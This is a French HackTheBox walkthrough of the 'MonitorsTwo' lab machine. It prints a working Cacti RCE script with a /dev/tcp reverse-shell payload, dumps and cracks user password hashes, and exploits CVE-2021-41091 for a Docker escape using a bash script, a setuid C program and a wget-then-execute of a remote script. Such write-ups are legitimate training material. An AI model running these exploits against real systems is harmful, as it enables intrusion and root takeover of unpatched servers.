---
title: MonitorsTwo - Easy (Linux)
categories:
- HackTheBox
- Write-up
tags:
- htb
- hack-the-box
- vulnérabilités
- CVE-2021-41091
- linux
- web
- docker
---

## User
### nmap

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 10:33 EDT
Nmap scan report for 10.129.228.231
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.01 seconds
```

### site

C'est un site qui héberge l'application cacti.

Cette application sert à administrer des serveurs, et présenter de nombreuses informations sous forme de graphes.

La version est la 1.22 et elle est vulnérable à une RCE sans authentification.

### RCE

Un simple script python est disponible sur internet :

```python
import requests
import urllib.parse

def checkVuln():
    result = requests.get(vulnURL, headers=header)
    return (result.text != "FATAL: You are not authorized to use this service" and result.status_code == 200)

def bruteForce():
    # brute force to find host id and local data id
    for i in range(1, 5):
        for j in range(1, 10):
            vulnIdURL = f"{vulnURL}?action=polldata&poller_id=1&host_id={i}&local_data_ids[]={j}"
            result = requests.get(vulnIdURL, headers=header)
    
            if result.text != "[]":
                # print(result.text)
                rrdName = result.json()[0]["rrd_name"]
                if rrdName == "polling_time" or rrdName == "uptime":
                    return True, i, j

    return False, -1, -1


def remoteCodeExecution(payload, idHost, idLocal):
    encodedPayload = urllib.parse.quote(payload)
    injectedURL = f"{vulnURL}?action=polldata&poller_id=;{encodedPayload}&host_id={idHost}&local_data_ids[]={idLocal}"
    
    result = requests.get(injectedURL,headers=header)
    print(result.text)

if __name__ == "__main__":
    targetURL = input("Enter the target address (like 'http://123.123.123.123:8080')")
    vulnURL = f"{targetURL}/remote_agent.php"
    # X-Forwarded-For value should be something in the database of Cacti
    header = {"X-Forwarded-For": "127.0.0.1"}
    print("Checking vulnerability...")
    if checkVuln():
        print("App is vulnerable")
        isVuln, idHost, idLocal = bruteForce()
        print("Brute forcing id...")
        # RCE payload
        ipAddress = "192.168.1.15"
        ipAddress = input("Enter your IPv4 address")
        port = input("Enter the port you want to listen on")
        payload = f"bash -c 'bash -i >& /dev/tcp/{ipAddress}/{port} 0>&1'"
        if isVuln:
            print("Delivering payload...")
            remoteCodeExecution(payload, idHost, idLocal)
        else:
            print("RRD not found")
    else:
        print("Not vulnerable")
```

Le script est assez simple :

Il va tenter de faire un brute-force sur l'host_id et le local_data_ids via le fichier /remote_agent.php.

Ce sont des ids qui sont très facilement devinables. Ensuite, la variable poller_id est vulnérable à une RCE, tout simplement en terminant une commande et en commençant une autre...

## Mouvement latéral
### Docker escape ?

Une fois sur la machine, on se rend vite compte via linpeas (ou même juste en faisant un ls) qu'on est dans docker. L'idée sera donc de s'en échapper.

Ce qu'on peut penser en premier c'est que vu que le binaire capsh est présent, il y ait des capacités qui nous permettent de nous échapper. Seulement, ce n'est pas le cas.

La seconde idée est tout simplement de lire le fichier entrypoint.sh :

```bash
cat /entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

On voit qu'il y a les mots de passe de base de mysql.

On peut se connecter et voir s'il y a des informations en plus, par exemple dans la table user_auth.

```bash
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root
<w/html$ mysql --host=db --user=root --password=root
USE cacti;
SELECT * FROM user_auth;
exit;
ERROR 1064 (42000) at line 3: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'exit' at line 1
id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees    policy_hosts        policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on      on      2       1       1       1       1       on      -1      -1 -1               0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1      -1              0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1       1       1       1       1       on      -1      -1 on       0       0       2135691668
```

On voit qu'il y a deux user qui vont beaucoup nous intéresser :

admin@monitorstwo.htb et marcus@monitorstwo.htb


### hashcat

On fait tourner hashcat.

```bash
kibatche@kibatche-System-Product-Name:/media/kibatche/Achille/shared_folder_vm/HTB/MonitorsTwo$ hashcat -m 3200 -a 0 ./marcus_hash.txt ../../rockyou.txt -w 3
hashcat (v6.2.5) starting

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: ../../rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
```

Et voilà le user.

marcus@monitorstwo.htb:funkymonkey

## Élévation de privilège.

Lorsqu'on se connecte, le serveur nous indique que nous avons un mail. Lisons donc immédiatement le mail :

```txt
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

En cherchant, les deux premières CVE ne sont pas très intéressantes. Par contre la dernière est un excellente option, quoique assez difficile à mettre en place.

### CVE-2021-41091

Ce bug est présent dans le programme moby, utilisé par docker.

Un très bon article [ici](https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure) explique par le menu ce bug.
### Explications

Linux utilise les "capacités" (capabilities) qui vont permettre à différent processus d'avoir certains pouvoirs et d'autres non.

Par exemple, le programme ping a la possibilité d'utiliser des raw socket, qui ne peuvent être utilisées qu'en tant que root, mais sans tous les autres attributs liés à root.

Ainsi, ping a bien le suid bit, mais n'a pas toutes les capacités qui pourraient être attachées à un processus lancé par root.

Docker utilise le concept des capacités afin de limiter ce que l'on peut faire au sein du conteneur.

Par exemple, si on lance un conteneur avec l'option **très** dangereuse `--privileged`
on va pouvoir constater que le conteneur a hérité de tous les privilèges possibles, et rendre la fuite d'un docker conteneur triviale :

```bash
capsh --print
Current: =ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=1000(root) euid=0(root)
gid=1000(marcus)
groups=1000(marcus)
Guessed mode: UNCERTAIN (0)
```

On voit ici que toutes les capacités sont présentes.

A l'inverse - de base - un conteneur possède seulement un nombre limité de capacités :

```bash
capsh --print
Current: cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap=eip
Bounding set =cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: cap_chown,!cap_dac_override,!cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,!cap_linux_immutable,cap_net_bind_service,!cap_net_broadcast,!cap_net_admin,cap_net_raw,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,cap_sys_chroot,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,cap_audit_write,!cap_audit_control,cap_setfcap,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=33(www-data)
Guessed mode: UNCERTAIN (0)
```

Un bug dans les overlay linux, largement utilisé par docker, permettait d'accéder à des dossiers de docker normalement inaccessibles.

Si on peut créer un binaire avec des capacités de type setuid et setgid, on peut alors faire en sorte d'utiliser ce binaire afin de devenir root sur la machine.

Un simple script bash nous permet de tester cela.

Il y a plusieurs manières de procéder :

- via bash : on devient root sur le conteneur, on fait chmod u+s sur bash. Ensuite, on revient sur l'hôte et on exécute bash -p. On devient root.
- via un programme : on devient root sur le conteneur, on importe un petit programme qu'on compile dans le conteneur (pour des question de librairie) :
```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
	exit(0);
}
```
```bash
gcc be_root.sh -o beroot
```

Ensuite on lui donne les capacités `setcap cap_setgid,capsetuid+eip beroot` et on l'exécute depuis l'hôte.

Exploit (avec bash) :
```bash
marcus@monitorstwo:~$ rm root_shell.sh* && wget http://10.10.14.97:4343/root_shell.sh && chmod +x root_shell.sh && ./root_shell.sh 
--2023-06-13 17:40:53--  http://10.10.14.97:4343/root_shell.sh
Connecting to 10.10.14.97:4343... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1719 (1.7K) [application/x-sh]
Saving to: ‘root_shell.sh’

root_shell.sh                                              100%[========================================================================================================================================>]   1.68K  --.-KB/s    in 0.001s  

2023-06-13 17:40:53 (2.88 MB/s) - ‘root_shell.sh’ saved [1719/1719]

Docker on the host is vulnerable
You need to be root the docker container.
To do so, you can try various technics.
If you have capsh installed on it, just do "capsh --gid=0 --uid=0 --"

Then, just chmod u+s on /bin/bash to set the suid bit on it.
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
You can also make a small program.
If you have wget or curl, just import and compile be_root.c on the container.
Then just set the capabilities on the program :
setcap cap_setgid,cap_setuid+eip beroot
Other example : setcap cap_setuid+ep /usr/bin/python3.8
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
When 'chmod u+s bash' is done, press a key : 
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/bin/bash: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls
cacti  root.txt
bash-5.1# 
```


Code :

```bash
#!/usr/bin/env bash

function is_vulnerable
{
	version=$(docker version 2>/dev/null | grep Version | awk '{print $2}' | cut -d '+' -f 1)
	if [ $(echo ${version} | cut -d '.' -f 1) -le 20 ];then
		if [ $(echo ${version} | cut -d '.' -f 2) -le 10 ];then
			if [ $(echo ${version} | cut -d '.' -f 3) -lt 9 ];then
				echo "Docker on the host is vulnerable"
				return 1
			fi
		fi
	fi
	echo "Docker on the host is not vulnerable"
	exit 1
}

function find_path
{
	echo "You need to be root on the docker container."
	echo "To do so, you can try various technics."
	echo 'If you have capsh installed on it, just do "capsh --gid=0 --uid=0 --"'
	echo "Then, just chmod u+s on /bin/bash to set the suid bit on it."
	echo "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities"
	echo "You can also make a small program."
	echo "If you have wget or curl, just import and compile be_root.c on the container."
	echo "Then just set the capabilities on the program :"
	echo "setcap cap_setgid,cap_setuid+eip beroot"
	echo "Other example : setcap cap_setuid+ep /usr/bin/python3.8"
	echo "/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\");'"
	read -p "When 'chmod u+s bash' is done, press a key : " key
	cutted_paths=$(findmnt | grep /var/lib/docker/overlay2/ | awk '{print $1}' | cut -d "/" -f6-)
	for path in $(echo ${cutted_paths});do
		/var/lib/docker/overlay2/${path}/bin/bash -p
		if [ $? -eq 0 ];then
			echo "The following path is vulnerable :"
			echo "/var/lib/docker/overlay2/${path}"
			echo "Bye !"
			exit 0
		fi
	done
}

is_vulnerable
find_path
```

Avec le programme:

```bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp$ ./beroot
root@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp# exit
exit
```


Et voilà !
